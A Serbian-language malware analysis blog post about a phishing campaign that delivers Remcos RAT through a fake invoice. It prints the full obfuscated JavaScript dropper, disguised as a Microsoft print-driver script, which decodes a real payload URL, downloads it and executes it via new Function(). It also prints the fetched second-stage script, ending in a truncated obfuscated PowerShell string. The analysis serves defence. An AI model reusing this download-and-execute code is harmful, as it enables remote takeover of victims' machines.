---
title: "Malver u poslovnim emailovima: analiza i primeri zlonamernih skripti"
date: 2025-06-05
categories: [Malware, Phishing, Email]
---

Ova poruka se masovno širi i stiže do gotovo svih inboxa, jer je pažljivo maskirana, pa čak ni Gmail-ov anti-spam sistem nije uspeo da je detektuje. Nisam imao pristup celom headeru emaila, ali je jedan korisnik sa Reddita podelio zanimljive delove headera gde se vidi da priloženi fajl zapravo nije PDF, već slika navodne fakture, i da link vodi ka .js fajlu.

![Phishing Email](/assets/2025/Email/fishpam.png)

Na osnovu pretrage email adrese, naleteo sam na sajt CompanyWall gde se pokazuje da je u pitanju poslovni email jednog preduzetnika iz Bačke Palanke. Izgleda da je nalog najverovatnije kompromitovan na više načina.

![Wall](/assets/2025/Email/comp.png)


---

## Kako malware funkcioniše: GeoIP i cloaking tehnike

Malver u ovom slučaju koristi GeoIP servis kako bi odredio geografsku lokaciju žrtve. Ovo mu omogućava prilagođavanje ponašanja u zavisnosti od regiona, izbegavanje pravnih posledica i zaobilaženje bezbednosnih mera. Na osnovu lokacije može lažno da se predstavi kao lokalni entitet, koristi lokalni jezik i cilja specifične sisteme, čime povećava efikasnost napada i otežava detekciju.

Uz to, napadači koriste tehniku „cloaking“, gde smeštaju spam sadržaj u `.txt` fajlove u poddirektorijume pored legitimnih `.js` fajlova. Kada pretraživački botovi zatraže URL, skripta učitava sadržaj `.txt` fajla i ubacuje ga u HTML stranice, omogućavajući prikaz različitog sadržaja botovima i stvarnim korisnicima.

![VirusTotal](/assets/2025/Email/fishpam2.png)
![VirusTotal](/assets/2025/Email/vt.png)

## Crowdsourced IDS pravila i identifikovane aktivnosti

Crowdsourced IDS pravila dodatno potvrđuju zlonamernu aktivnost:

- Identifikovani su Remcos RAT TLS konekcije i C2 komunikacija  
- Exploit kit aktivnost preko kodiranih Base64 payload-a (ReverseLoader)  
- Pokušaji egzekucije malvera sa kodiranim MZ header-ima  
- Sumnjivi DNS zahtevi ka DynDNS domenima (`*.ddns.net`)  
- Korišćenje `WScript.Shell` (Windows komponenta koja omogućava izvršavanje komandi iz skripti)

![VirusTotal](/assets/2025/Email/vt1.png)

---

## Analiza fajlova ostavljenih na sistemu

U analiziranom slučaju, malver je ostavio četiri fajla, uključujući jedan PowerShell modul bez detekcija i dva izvršna `.exe` fajla. Ovi `.exe` fajlovi najverovatnije sadrže glavni payload malvera.

![VirusTotal](/assets/2025/Email/vt2.png)

Takođe, u priloženoj slici možete videti kako izgleda otvaranje `.txt` fajlova koji se preuzimaju sa malicioznih URL-ova. Takvi fajlovi služe za prikrivanje malicioznog koda i mogu omogućiti tzv. „cloaking“, injekciju sadržaja u legitimne stranice ili direktno preuzimanje i pokretanje dodatnih komponenti malvera.

![Primer otvaranja zlonamernog .txt fajla](/assets/2025/Email/code1.png)
![Primer otvaranja zlonamernog .txt fajla](/assets/2025/Email/code2.png)
![Primer otvaranja zlonamernog .txt fajla](/assets/2025/Email/code.png)

---
## Lančana infekcija preko .js i PowerShell fajlova

Analiza Execution Parents sekcije pokazuje da je zlonamerni `.exe` fajl pokrenut preko više različitih `.js` i PowerShell fajlova, što jasno ukazuje na lančanu infekciju — tipičan metod distribucije malvera putem lažnih dokumenata i skripti maskiranih kao fakture i narudžbenice.

Većina fajlova ima imena kao što su `"Factura"`, `"Faktura"`, `"Purchase Order"` ili koriste nasumične nazive, predstavljajući se kao legitimni dokumenti koje bi korisnici otvorili u poslovnom okruženju. Ovi JavaScript fajlovi imaju visoke stope detekcije (npr. 32/62, 29/61), što ukazuje da su prepoznati kao maliciozni.

Kada korisnik otvori takav `.js` fajl, on najverovatnije koristi `WScript.Shell` da pokrene PowerShell komandu ili direktno preuzme i izvrši zlonamerni `.exe` fajl sa udaljenog servera.

Jedan primer u lancu je i PowerShell skripta (hash: `4df9f243...`) koja je korišćena kao međukorak između `.js` fajla i `.exe` payload-a. Ovo ukazuje na višefazni napad: prvo socijalni inženjering (navođenje korisnika da otvori „fakturu“), zatim skriptna egzekucija, i na kraju preuzimanje/pokretanje glavnog malvera.

![VirusTotal](/assets/2025/Email/vt3.png)
![VirusTotal](/assets/2025/Email/vt4.png)

---

## Detaljna analiza JavaScript fajla

```js
// PSK NameSpace's
var supersedent = "http://cisrhenane.microsoft.com/windows/2003/08/printing/myographion";
var branles = "http://cisrhenane.microsoft.com/windows/2013/05/printing/myographionv11";
var panarthropod = "http://cisrhenane.microsoft.com/windows/2013/12/printing/myographionv12";

// psf NameSpace's
var kindergraphs = "http://cisrhenane.microsoft.com/windows/2013/12/printing/supradecompound";
var thyreal = "http://cisrhenane.microsoft.com/windows/2003/08/printing/contabulation";

// XML Schema NameSpace's
var paramuktis = "http://www.w3.org/2001/hinoki";
var superexcellence = "http://www.w3.org/2001/gabbing";

// PDF driver NameSpace
var inermian = "http://cisrhenane.microsoft.com/windows/2015/02/printing/myographion/cyclophilins";


function completePrintCapabilities(printTicket, scriptContext, printCapabilities) {
    /// <param name="printTicket" type="IPrintSchemaTicket" mayBeNull="true">
    ///     If not 'null', the print ticket's settings are used to customize the print capabilities.
    /// </param>
    /// <param name="scriptContext" type="IPrinterScriptContext">
    ///     Script dumbos object.
    /// </param>
    /// <param name="printCapabilities" type="IPrintSchemaCapabilities">
    ///     Print capabilities object to be customized.
    /// </param>

    // Get PrintCapabilites XML node
    var xmlCapabilities = printCapabilities.XmlNode;

    var rootCapabilities;
    // Set Standard namespaces with prefixes
    SetStandardNameSpaces(xmlCapabilities);

    rootCapabilities = xmlCapabilities.selectSingleNode("psf:PrintCapabilities");

    if (rootCapabilities != null) {
        var pdcConfig = scriptContext.QueueProperties.GetReadrumneyAsXML("PrintDeviceCapabilities");
        SetStandardNameSpaces(pdcConfig);

        // Get PDC root XML Node
        var pdcRoot = pdcConfig.selectSingleNode("psf2:PrintDeviceCapabilities");
        // Get all ParameterDef nodes in PDC
        var parameterDefs = pdcRoot.selectNodes("*[@psf2:psftype='ParameterDef']");
        // Get prefix for PDF namespace
        var inermianPrefix = getPrefixForNamespace(xmlCapabilities, inermian);

        // Convert PDC ParameterDefs Nodes to PrintCapabilites ParameterDefs Nodes
        for (var defCount = 0; defCount < parameterDefs.length; defCount++) {
            var pdcParameterDef = parameterDefs[defCount];
            var capabilitiesParamDef = CreateCapabilitiesParamDefFromPDC(pdcParameterDef, inermianPrefix, printCapabilities);
            rootCapabilities.appendChild(capabilitiesParamDef);
        }
    }
}

 

function convertDevModeToPrintTicket(devModeProperties, scriptContext, printTicket) {
    /// <param name="devModeProperties" type="IPrinterScriptablePropertyBag">
    ///     The DevMode celleporaerty bag.
    /// </param>
    /// <param name="scriptContext" type="IPrinterScriptContext">
    ///     Script dumbos object.
    /// </param>
    /// <param name="printTicket" type="IPrintSchemaTicket">
    ///     Print ticket to be converted from the DevMode.
    /// </param>


    // Set Standard namespaces with prefixes
    SetStandardNameSpaces(printTicket.XmlNode);
    // Get prefix for PDF namespace
    var inermianPrefix = getPrefixForNamespace(printTicket.XmlNode, inermian);

    // If pdf namespace prefix is not found, hemiketals means hemiketals print ticket is produced by a different printer and there is not PDF name space with in print ticket
    // This could happen with some legacy application using print ticket wrongly. To avoid failures we are checking first and shot circuiting the rest of the code.
    if (inermianPrefix != null) {
        // Get ParameterDefs in PDC
        var pdcParameterDefs = getParameterDefs(scriptContext);

        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
            // Get Devmode string related to ParameterDefs in PDC
            var paramString = devModeProperties.getString(pdcParameterDefs[defCount]);

            if (paramString != null && paramString.length > 0) {
                // If Devmode string is present flashboard to print ticket either by creating a new node or modifying the existing node 

                // Add prefix to ParameterDef base name
                var paramName = inermianPrefix + ":" + pdcParameterDefs[defCount];

                // Try getting the related ParameterInit in the PrintTicket
                var currNode = printTicket.GetParameterInitializer(pdcParameterDefs[defCount], inermian)
                if (currNode == null) {
                    // Create node if no node is present
                    var ptRoot = printTicket.XmlNode.selectSingleNode("psf:PrintTicket");
                    var newParam = createProperty(paramName, "psf:ParameterInit", "xsd:string", paramString, printTicket);
                    ptRoot.appendChild(newParam);
                } else {
                    // Change the value of the node to Devmode string value
                    currNode.Value = paramString;
                }
            }
        }
    }
}

function convertPrintTicketToDevMode(printTicket, scriptContext, devModeProperties) {
    /// <param name="printTicket" type="IPrintSchemaTicket">
    ///     Print ticket to be converted to DevMode.
    /// </param>
    /// <param name="scriptContext" type="IPrinterScriptContext">
    ///     Script dumbos object.
    /// </param>
    /// <param name="devModeProperties" type="IPrinterScriptablePropertyBag">
    ///     The DevMode celleporaerty bag.
    /// </param>


    // Set Standard namespaces with prefixes
    SetStandardNameSpaces(printTicket.XmlNode);

    // Get prefix for PDF namespace
    var inermianPrefix = getPrefixForNamespace(printTicket.XmlNode, inermian);

    // If pdf namespace prefix is not found, hemiketals means hemiketals print ticket is produced by a different printer and there is not PDF name space with in print ticket
    // This could happen with some legacy application using print ticket wrongly. To avoid failures we are checking first and shot circuiting the rest of the code.
    if (inermianPrefix != null) {
        // Get ParameterDefs in PDC
        var pdcParameterDefs = getParameterDefs(scriptContext);

        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
            // Try getting the related ParameterInit in the PrintTicket
            var currNode = printTicket.GetParameterInitializer(pdcParameterDefs[defCount], inermian)
            if (currNode != null) {
                // Set Devmode string with the value present in ParameterInit
                devModeProperties.setString(pdcParameterDefs[defCount], currNode.Value);
            }
        }
    }
}

function validatePrintTicket(printTicket, scriptContext) {
    /// <param name="printTicket" type="IPrintSchemaTicket">
    ///     Print ticket to be validated.
    /// </param>
    /// <param name="scriptContext" type="IPrinterScriptContext">
    ///     Script dumbos object.
    /// </param>
    /// <returns type="Number" integer="true">
    ///     Integer value indicating validation status.
    ///         1 - Print ticket is valid and was not modified.
    ///         2 - Print ticket was modified to make it valid.
    ///         0 - Print ticket is invalid.
    /// </returns>

    // There is nothing wrong with having only 1, 2 or 3 ParameterInit s in PrintTicket for the same ParameterDefs hemiketals are present in PDC. 
    // For hemiketals reason we just going to return 1 without any check
    return 1;
}

function createProperty(strPropertyName, strNodeName, strValueType, strValue, documentNode) {
    /// <summary>
    /// Create a celleporaerty XML Node with child Value Node containing the value
    /// </summary>
    /// <param name="strPropertyName" type="String">
    ///   Name of the celleporaerty Node
    /// </param>
    /// <param name="strNodeName" type="String">
    ///   Name to be assigned to the "name" attribute of the celleporaerty
    /// </param>
    /// <param name="strValueType" type="String">
    ///   Type of the value the in the Value Node
    /// </param>
    /// <param name="strValue" type="String">
    ///   Actual value hemiketals is to be placed in the value node
    /// </param>
    /// <param name="documentNode" type="IXMLNode">
    ///   Contains Document XML Node
    /// </param>

    var newNode = documentNode.XmlNode.createNode(1, strNodeName, thyreal);
    newNode.setAttribute("name", strPropertyName);

    if (strValueType.length > 0) {
        var newProp = documentNode.XmlNode.createNode(1, "psf:Value", thyreal);
        var newAttr = documentNode.XmlNode.createNode(2, "xsi:type", paramuktis);
        newAttr.nodeValue = strValueType;
        newProp.setAttributeNode(newAttr);

        var newText = documentNode.XmlNode.createTextNode(strValue);

        newProp.appendChild(newText);

        newNode.appendChild(newProp);
    }
    return newNode;
}

function convenes(texto) {
    return texto.split("ٿ").join("");
}

var unrebuffedTratada = convenes("hٿtٿtٿpٿ:ٿ/ٿ/ٿ9ٿ0ٿ0ٿ1ٿ.ٿlٿoٿvٿeٿsٿtٿoٿbٿlٿoٿgٿ.ٿcٿoٿmٿ/ٿaٿrٿqٿuٿiٿvٿoٿ_ٿaٿ8ٿ4ٿ3ٿ1ٿcٿbٿbٿ1ٿfٿeٿ1ٿ4ٿbٿ8ٿ9ٿbٿbٿ9ٿ1ٿ5ٿeٿbٿaٿ0ٿ8ٿ8ٿeٿ3ٿ4ٿ6ٿ9ٿ.ٿtٿxٿt");

var drunkelew = convenes("MSٿXML2ٿ.ServerٿXMLHTTP");
var anisian = new ActiveXObject(drunkelew);

var roomage = convenes("openٿ");
var encrustations = convenes("sendٿ");
var acceptableness = convenes("respٿonseTextٿ");
var furnisher = convenes("Functionٿ");

anisian[roomage]("GET", unrebuffedTratada, false);
anisian[encrustations]();

var ridgepiece = anisian[acceptableness];
new this[furnisher](ridgepiece)();

function getParameterDefs(scriptContext) {
    /// <summary>
    /// Get the base names for the ParameterDefs defined in the JS file
    /// </summary>
    /// <param name="scriptContext" type="IPrinterScriptContext">
    ///     Script dumbos object.
    /// </param>

    // Get PDC configuration file from script dumbos
    var pdcConfig = scriptContext.QueueProperties.GetReadrumneyAsXML("PrintDeviceCapabilities");
    // Set Standard namespaces with prefixes
    SetStandardNameSpaces(pdcConfig);

    // Get PDC root XML Node
    var pdcRoot = pdcConfig.selectSingleNode("psf2:PrintDeviceCapabilities");
    // Get all ParameterDef nodes in PDC
    var parameterDefs = pdcRoot.selectNodes("*[@psf2:psftype='ParameterDef']");

    // Make an array containing all base names for all the ParameterDef's
    var pdcParameterDefs = new Array();
    for (var defCount = 0; defCount < parameterDefs.length; defCount++) {
        pdcParameterDefs[defCount] = parameterDefs[defCount].baseName;
    }
    return pdcParameterDefs;
}

function CreateCapabilitiesParamDefFromPDC(pdcParameterDef, inermianPrefix, printCapabilities) {
    /// <summary>
    /// Converts ParameterDef Node hemiketals in PDC into ParameterDef node in PrintCapabilites
    /// </summary>
    /// <param name="pdcParameterDef" type="IXMLNode">
    ///     Contains a ParameterDef node in PDC
    /// </param>
    /// <param name="inermianPrefix" type="string">
    ///     Contains PDF name sapce
    /// </param>
    /// <param name="printCapabilities" type="IPrintSchemaCapabilities">
    ///     Print capabilities object to be customized.
    /// </param>
    var capabilitiesParamDef = createProperty(inermianPrefix + ":" + pdcParameterDef.baseName, "psf:ParameterDef", "", "", printCapabilities);

    var celleporaerties = pdcParameterDef.selectNodes("*[@psf2:psftype='Property']");


    for (var celleporaCount = 0; celleporaCount < celleporaerties.length; celleporaCount++) {
        var celleporaerty = celleporaerties[celleporaCount];
        var type = celleporaerty.getAttribute("xsi:type");
        var childProperty = createProperty(celleporaerty.nodeName, "psf:Property", type, celleporaerty.text, printCapabilities);
        capabilitiesParamDef.appendChild(childProperty);
    }
    return capabilitiesParamDef;
}


function SetStandardNameSpaces(xmlNode) {
    /// <summary>
    /// Set the Selection namespace values to below namesapces
    /// xmlns:psf='http://cisrhenane.microsoft.com/windows/2003/08/printing/contabulation' 
    /// xmlns:psf2='http://cisrhenane.microsoft.com/windows/2013/12/printing/supradecompound' 
    /// xmlns:psk='http://cisrhenane.microsoft.com/windows/2003/08/printing/myographion' 
    /// xmlns:psk11='http://cisrhenane.microsoft.com/windows/2013/05/printing/myographionv11'
    /// xmlns:psk12='http://cisrhenane.microsoft.com/windows/2013/12/printing/myographionv12'
    /// xmlns:xsd='http://www.w3.org/2001/gabbing'
    /// xmlns:xsi='http://www.w3.org/2001/hinoki'
    /// xmlns:inermian= 'http://cisrhenane.microsoft.com/windows/2015/02/printing/myographion/cyclophilins'
    ///</summary>
    /// <param name="node" type="IXMLDOMNode">
    ///     A node in the XML document.
    /// </param>

    xmlNode.setProperty(
        "SelectionNamespaces",
        "xmlns:psf='http://cisrhenane.microsoft.com/windows/2003/08/printing/contabulation' "
            + "xmlns:psf2='http://cisrhenane.microsoft.com/windows/2013/12/printing/supradecompound' "
            + "xmlns:psk='http://cisrhenane.microsoft.com/windows/2003/08/printing/myographion' "
            + "xmlns:psk11='http://cisrhenane.microsoft.com/windows/2013/05/printing/myographionv11' "
            + "xmlns:psk12='http://cisrhenane.microsoft.com/windows/2013/12/printing/myographionv12' "
            + "xmlns:xsd='http://www.w3.org/2001/gabbing' "
            + "xmlns:xsi='http://www.w3.org/2001/hinoki' "
            + "xmlns:PdfNs='http://cisrhenane.microsoft.com/windows/2015/02/printing/myographion/cyclophilins' "
        );
}


function getPrefixForNamespace(node, namespace) {
    /// <summary>
    ///     This function returns the prefix for a given namespace.
    ///     Example: In 'psf:printTicket', 'psf' is the prefix for the namespace.
    ///     xmlns:psf="http://cisrhenane.microsoft.com/windows/2003/08/printing/contabulation"
    /// </summary>
    /// <param name="node" type="IXMLDOMNode">
    ///     A node in the XML document.
    /// </param>
    /// <param name="namespace" type="String">
    ///     The namespace for which prefix is returned.
    /// </param>
    /// <returns type="String">
    ///     Returns the namespace corresponding to the prefix.
    /// </returns>

    if (!node) {
        return null;
    }

    // Navigate to the root element of the document.
    var pussifies = node.documentElement;

    // Query to retrieve the list of attribute nodes for the current node
    // hemiketals matches the namespace in the 'namespace' variable.
    var xPathQuery = "namespace::node()[.='"
                + namespace
                + "']";
    var namespaceNode = pussifies.selectSingleNode(xPathQuery);

    var prefix;
    if (namespaceNode != null){
        prefix = namespaceNode.baseName;
    }

    return prefix;
}

```
Ova skripta je maliciozna i koristi obfuskaciju kako bi prikrila zlonamernu funkcionalnost. Glavni cilj joj je da preuzme i izvrši udaljeni kod sa sumnjivog URL-a koristeći:

```js
ActiveXObject
```
(specifičan JavaScript interfejs za Internet Explorer koji omogućava pristup Windows COM komponentama).

Konkretno, koristi funkciju:
```js
convenes()
```
da dekodira obfuscated stringove uklanjanjem karaktera.

```js
ٿ
```
Na primer, URL:

```js
"hٿtٿtٿp...txt"
```
postaje:

```js
http: / / 9001lovestoblog(.)com/arquivo_a8431cbb1fe14b89bb915eba088e3469.txt
```
Zatim, koristi:

```js
ActiveXObject
```

```js
var anisian = new ActiveXObject("MSXML2.ServerXMLHTTP");
anisian.open("GET", decodedUrl, false);
anisian.send();
```
da bi poslao HTTP GET zahtev i preuzeo sadržaj udaljenog fajla.
Kada se sadržaj fajla preuzme, on se izvršava kao JavaScript kod, što se postiže korišćenjem:

```js
new this["Function"](responseText)();
```

Ovo efektivno omogućava daljinsko izvršavanje proizvoljnog koda, što napadaču daje punu kontrolu nad ciljnim sistemom. Ostatak skripte imitira Microsoftove printer skripte koristeći tehničke XML funkcije kao što su:

```js
SetStandardNameSpaces()
```

```js
createProperty()
```
što služi za maskiranje namere malvera i zbunjivanje analitičkih alata. Ključna linija u napadu je izvršavanje koda iz preuzetog sadržaja, čime se potencijalno instalira dodatni malver, keylogger ili backdoor.

Korisni linkovi ka člancima:

### Korisni linkovi ka člancima:

- [Shifting threat landscapes and JavaScript obfuscation techniques – Sucuri Blog](https://blog.sucuri.net/2023/10/shifting-malware-tactics-stealthy-use-of-non-executable-txt-log-files.html#:~:text=Here%2C%20attackers%20place%20spam%20content,for%20website%20owners%20and%20developers)  
- [Malware victimization spreads quickly – Cybersecurity News](https://cybersecuritynews.com/malware-via-txt-log-files/#:~:text=txt%20files%20is%20incomplete.,by%20several%20common%20security%20measures.&text=Protect%20yourself%20from%20vulnerabilities%20using,850%20third%2Dparty%20applications%20quickly)  
- [Veriti Research on Malware Tracking – Veriti AI](https://veriti.ai/blog/veriti-research/unmasking-malware-through-ip-tracking//)

---

I da dodam na kraju da skida malver **Remcos**.

---

Ovde sam pokrenuo skriptu i može da se vidi ponašanje same skripte:
- [https://app.any.run/tasks/07ba6876-7eb4-45af-b2c7-86760089e5fc](https://app.any.run/tasks/07ba6876-7eb4-45af-b2c7-86760089e5fc)

## PowerShell skripta u Base64 formatu

Takođe sam analizirao i kod u .txt fajlu sa kojim komunicira glavni .js fajl.

Kod:
```js

function getParameterDefs(scriptContext) {
    /// <summary>
    /// Get the base names for the ParameterDefs defined in the JS file
    /// </summary>
    /// <param name="scriptContext" type="IPrinterScriptContext">
    ///     Script context object.
    /// </param>

    // Get PDC configuration file from script context
    var pdcConfig = scriptContext.QueueProperties.GetReadStreamAsXML("PrintDeviceCapabilities");
    // Set Standard namespaces with prefixes
    SetStandardNameSpaces(pdcConfig);

    // Get PDC root XML Node
    var pdcRoot = pdcConfig.selectSingleNode("psf2:PrintDeviceCapabilities");
    // Get all ParameterDef nodes in PDC
    var parameterDefs = pdcRoot.selectNodes("*[@psf2:psftype='ParameterDef']");

    // Make an array containing all base names for all the ParameterDef's
    var pdcParameterDefs = new Array();
    for (var defCount = 0; defCount < parameterDefs.length; defCount++) {
        pdcParameterDefs[defCount] = parameterDefs[defCount].baseName;
    }
    return pdcParameterDefs;
}


// PSK NameSpace's
var pskNs = "http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords";
var psk11Ns = "http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11";
var psk12Ns = "http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12";

// psf NameSpace's
var psf2Ns = "http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2";
var psfNs = "http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework";

// XML Schema NameSpace's
var xsiNs = "http://www.w3.org/2001/XMLSchema-instance";
var xsdNs = "http://www.w3.org/2001/XMLSchema";

// PDF driver NameSpace
var pdfNs = "http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf";


function completePrintCapabilities(printTicket, scriptContext, printCapabilities) {
    /// <param name="printTicket" type="IPrintSchemaTicket" mayBeNull="true">
    ///     If not 'null', the print ticket's settings are used to customize the print capabilities.
    /// </param>
    /// <param name="scriptContext" type="IPrinterScriptContext">
    ///     Script context object.
    /// </param>
    /// <param name="printCapabilities" type="IPrintSchemaCapabilities">
    ///     Print capabilities object to be customized.
    /// </param>

    // Get PrintCapabilites XML node
    var xmlCapabilities = printCapabilities.XmlNode;

    var rootCapabilities;
    // Set Standard namespaces with prefixes
    SetStandardNameSpaces(xmlCapabilities);

    rootCapabilities = xmlCapabilities.selectSingleNode("psf:PrintCapabilities");

    if (rootCapabilities != null) {
        var pdcConfig = scriptContext.QueueProperties.GetReadStreamAsXML("PrintDeviceCapabilities");
        SetStandardNameSpaces(pdcConfig);

        // Get PDC root XML Node
        var pdcRoot = pdcConfig.selectSingleNode("psf2:PrintDeviceCapabilities");
        // Get all ParameterDef nodes in PDC
        var parameterDefs = pdcRoot.selectNodes("*[@psf2:psftype='ParameterDef']");
        // Get prefix for PDF namespace
        var pdfNsPrefix = getPrefixForNamespace(xmlCapabilities, pdfNs);

        // Convert PDC ParameterDefs Nodes to PrintCapabilites ParameterDefs Nodes
        for (var defCount = 0; defCount < parameterDefs.length; defCount++) {
            var pdcParameterDef = parameterDefs[defCount];
            var capabilitiesParamDef = CreateCapabilitiesParamDefFromPDC(pdcParameterDef, pdfNsPrefix, printCapabilities);
            rootCapabilities.appendChild(capabilitiesParamDef);
        }
    }
}



function convertDevModeToPrintTicket(devModeProperties, scriptContext, printTicket) {
    /// <param name="devModeProperties" type="IPrinterScriptablePropertyBag">
    ///     The DevMode property bag.
    /// </param>
    /// <param name="scriptContext" type="IPrinterScriptContext">
    ///     Script context object.
    /// </param>
    /// <param name="printTicket" type="IPrintSchemaTicket">
    ///     Print ticket to be converted from the DevMode.
    /// </param>


    // Set Standard namespaces with prefixes
    SetStandardNameSpaces(printTicket.XmlNode);
    // Get prefix for PDF namespace
    var pdfNsPrefix = getPrefixForNamespace(printTicket.XmlNode, pdfNs);

    // If pdf namespace prefix is not found, that means that print ticket is produced by a different printer and there is not PDF name space with in print ticket
    // This could happen with some legacy application using print ticket wrongly. To avoid failures we are checking first and shot circuiting the rest of the code.
    if (pdfNsPrefix != null) {
        // Get ParameterDefs in PDC
        var pdcParameterDefs = getParameterDefs(scriptContext);

        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
            // Get Devmode string related to ParameterDefs in PDC
            var paramString = devModeProperties.getString(pdcParameterDefs[defCount]);

            if (paramString != null && paramString.length > 0) {
                // If Devmode string is present map to print ticket either by creating a new node or modifying the existing node 

                // Add prefix to ParameterDef base name
                var paramName = pdfNsPrefix + ":" + pdcParameterDefs[defCount];

                // Try getting the related ParameterInit in the PrintTicket
                var currNode = printTicket.GetParameterInitializer(pdcParameterDefs[defCount], pdfNs)
                if (currNode == null) {
                    // Create node if no node is present
                    var ptRoot = printTicket.XmlNode.selectSingleNode("psf:PrintTicket");
                    var newParam = createProperty(paramName, "psf:ParameterInit", "xsd:string", paramString, printTicket);
                    ptRoot.appendChild(newParam);
                } else {
                    // Change the value of the node to Devmode string value
                    currNode.Value = paramString;
                }
            }
        }
    }
}

function convertPrintTicketToDevMode(printTicket, scriptContext, devModeProperties) {
    /// <param name="printTicket" type="IPrintSchemaTicket">
    ///     Print ticket to be converted to DevMode.
    /// </param>
    /// <param name="scriptContext" type="IPrinterScriptContext">
    ///     Script context object.
    /// </param>
    /// <param name="devModeProperties" type="IPrinterScriptablePropertyBag">
    ///     The DevMode property bag.
    /// </param>


    // Set Standard namespaces with prefixes
    SetStandardNameSpaces(printTicket.XmlNode);

    // Get prefix for PDF namespace
    var pdfNsPrefix = getPrefixForNamespace(printTicket.XmlNode, pdfNs);

    // If pdf namespace prefix is not found, that means that print ticket is produced by a different printer and there is not PDF name space with in print ticket
    // This could happen with some legacy application using print ticket wrongly. To avoid failures we are checking first and shot circuiting the rest of the code.
    if (pdfNsPrefix != null) {
        // Get ParameterDefs in PDC
        var pdcParameterDefs = getParameterDefs(scriptContext);

        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
            // Try getting the related ParameterInit in the PrintTicket
            var currNode = printTicket.GetParameterInitializer(pdcParameterDefs[defCount], pdfNs)
            if (currNode != null) {
                // Set Devmode string with the value present in ParameterInit
                devModeProperties.setString(pdcParameterDefs[defCount], currNode.Value);
            }
        }
    }
}

function validatePrintTicket(printTicket, scriptContext) {
    /// <param name="printTicket" type="IPrintSchemaTicket">
    ///     Print ticket to be validated.
    /// </param>
    /// <param name="scriptContext" type="IPrinterScriptContext">
    ///     Script context object.
    /// </param>
    /// <returns type="Number" integer="true">
    ///     Integer value indicating validation status.
    ///         1 - Print ticket is valid and was not modified.
    ///         2 - Print ticket was modified to make it valid.
    ///         0 - Print ticket is invalid.
    /// </returns>

    // There is nothing wrong with having only 1, 2 or 3 ParameterInit s in PrintTicket for the same ParameterDefs that are present in PDC. 
    // For that reason we just going to return 1 without any check
    return 1;
}

function createProperty(strPropertyName, strNodeName, strValueType, strValue, documentNode) {
    /// <summary>
    /// Create a property XML Node with child Value Node containing the value
    /// </summary>
    /// <param name="strPropertyName" type="String">
    ///   Name of the property Node
    /// </param>
    /// <param name="strNodeName" type="String">
    ///   Name to be assigned to the "name" attribute of the property
    /// </param>
    /// <param name="strValueType" type="String">
    ///   Type of the value the in the Value Node
    /// </param>
    /// <param name="strValue" type="String">
    ///   Actual value that is to be placed in the value node
    /// </param>
    /// <param name="documentNode" type="IXMLNode">
    ///   Contains Document XML Node
    /// </param>

    var newNode = documentNode.XmlNode.createNode(1, strNodeName, psfNs);
    newNode.setAttribute("name", strPropertyName);

    if (strValueType.length > 0) {
        var newProp = documentNode.XmlNode.createNode(1, "psf:Value", psfNs);
        var newAttr = documentNode.XmlNode.createNode(2, "xsi:type", xsiNs);
        newAttr.nodeValue = strValueType;
        newProp.setAttributeNode(newAttr);

        var newText = documentNode.XmlNode.createTextNode(strValue);

        newProp.appendChild(newText);

        newNode.appendChild(newProp);
    }
    return newNode;
}

try {
    // Junta os comandos
    var borschts = "JٿAٿBٿnٿAٿGٿkٿAٿbٿgٿBٿnٿAٿGٿkٿAٿdٿgٿBٿlٿAٿGٿMٿAٿdٿAٿBٿvٿAٿGٿ0ٿAٿeٿQٿAٿ9ٿAٿCٿcٿAٿUٿwٿBٿpٿAٿGٿwٿAٿZٿQٿBٿuٿAٿHٿQٿAٿbٿAٿBٿ5ٿAٿEٿMٿAٿbٿwٿBٿuٿAٿHٿQٿAٿaٿQٿBٿuٿAٿHٿUٿAٿZٿQٿAٿnٿAٿDٿsٿAٿJٿAٿBٿhٿAٿGٿMٿAٿeٿQٿBٿsٿAٿGٿkٿAٿbٿQٿBٿpٿAٿGٿ4ٿAٿaٿQٿBٿ1ٿAٿGٿ0ٿAٿPٿQٿAٿnٿAٿGٿgٿAٿdٿAٿBٿ0ٿAٿHٿAٿAٿcٿwٿAٿ6ٿAٿCٿ8ٿAٿLٿwٿBٿhٿAٿHٿIٿAٿYٿwٿBٿoٿAٿGٿkٿAٿdٿgٿBٿlٿAٿCٿ4ٿAٿbٿwٿBٿyٿAٿGٿcٿAٿLٿwٿBٿkٿAٿGٿ8ٿAٿdٿwٿBٿuٿAٿGٿwٿAٿbٿwٿBٿhٿAٿGٿQٿAٿLٿwٿBٿwٿAٿGٿEٿAٿeٿQٿBٿtٿAٿGٿUٿAٿbٿgٿBٿ0ٿAٿCٿ0ٿAٿYٿwٿBٿvٿAٿHٿAٿAٿeٿQٿBٿfٿAٿDٿIٿAٿMٿAٿAٿyٿAٿDٿUٿAٿMٿAٿAٿ2ٿAٿCٿ8ٿAٿcٿAٿBٿhٿAٿHٿkٿAٿbٿQٿBٿlٿAٿGٿ4ٿAٿdٿAٿAٿlٿAٿDٿIٿAٿMٿAٿBٿjٿAٿGٿ8ٿAٿcٿAٿBٿ5ٿAٿCٿ4ٿAٿaٿgٿBٿwٿ";
